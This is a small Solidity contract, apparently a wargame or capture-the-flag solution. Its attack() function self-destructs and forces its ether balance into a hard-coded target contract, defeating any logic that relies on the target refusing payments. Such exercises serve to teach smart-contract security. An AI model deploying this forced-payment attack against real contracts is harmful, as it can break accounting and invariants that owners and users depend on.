// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract Solution {
    address targetAddress = 0x28e42E7c4bdA7c0381dA503240f2E54C70226Be2;
    function attack() public payable {
        address payable addr = payable(targetAddress);
        selfdestruct(addr);
    }
}
